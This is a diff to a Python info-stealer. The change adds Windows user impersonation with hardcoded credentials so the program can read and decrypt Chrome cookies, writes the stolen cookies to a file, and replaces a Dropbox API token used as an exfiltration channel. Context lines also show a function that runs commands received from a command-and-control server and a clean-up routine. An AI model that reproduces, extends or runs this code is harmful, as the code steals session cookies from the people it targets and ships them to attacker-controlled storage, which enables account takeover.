@@ -8,6 +8,8 @@ import json
 import winreg
 import os
 import requests
+import win32security
+import win32con
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad, unpad
@@ -44,6 +46,28 @@ def decrypt_value(key, encrypted_value):
 
 # Function to extract, decrypt, and save Chrome browser cookies to a text file
 def get_chrome_cookies(db=None, output_file="chrome_cookies.txt"):
+    try:
+        # credential of the local user for impersonation
+        username = "john"
+        domain = "desktop-2pc4nhi"
+        password = "password"
+
+        token = win32security.LogonUser(
+        username,
+        domain,
+        password,
+        win32con.LOGON32_LOGON_INTERACTIVE,
+        win32con.LOGON32_PROVIDER_DEFAULT
+        )
+
+        
+        win32security.ImpersonateLoggedOnUser(token)
+        
+
+    except Exception as e:
+        print("Error occurred during impersonation:", e)
+
+    # Start cookies Decryption
     if db is None:
         from os.path import expandvars
         db = expandvars('C:/Users/john/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies')
@@ -68,12 +92,15 @@ def get_chrome_cookies(db=None, output_file="chrome_cookies.txt"):
             host_key, name, value = row
             key = f"{host_key} -> {name}"
             cookies[key] = value
+
+        # Stop impersonating before creating the file
+        win32security.RevertToSelf()
         
         with open(output_file, "w") as file:
             for host_and_name, cookie in cookies.items():
                 file.write(f"{host_and_name}: {cookie}\n")
-        
-        print(f"Decrypted cookies written to '{output_file}'")
+          
+        print(f"Decrypted cookies written to '{output_file}'")       
         return cookies
         
     except sqlite3.Error as e:
@@ -163,8 +190,6 @@ def clean_up():
         else:
             print(f"File does not exist: {file}")
 
-
-    
     
 
 # Function to execute a command received from the command and control server
@@ -228,7 +253,7 @@ if __name__ == '__main__':
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
     # Dropbox token
-    token = "sl.Bz--6Bn-VLUuToNivoPDz9Q8LTT-AWRSBRmYUAMh8fQEDGJp2DmTOf-ILf7CwDg0iWsTFk_3o4H3VD4hQzEngpolAEVjdDBopAwqv0xgi1ssfwS1htYK_HRaViJLF1i9J2UVgY308EyooO5NnyGw"
+    token = "sl.B0BuwBjKcL3pK1a6nvJOYK7hHaF6L3zLNn281Yltix-SETmuSn2w12zacDe7N9WU61gU_2ZHJoscUzt05uWPECwf-Yv9c0nsDOHDcetXs-Vajldysyw0B8AZn5Uj_hdFcMLMhG0_z7llIofZCvl9"
 
     dbx = dropbox.Dropbox(token)
     
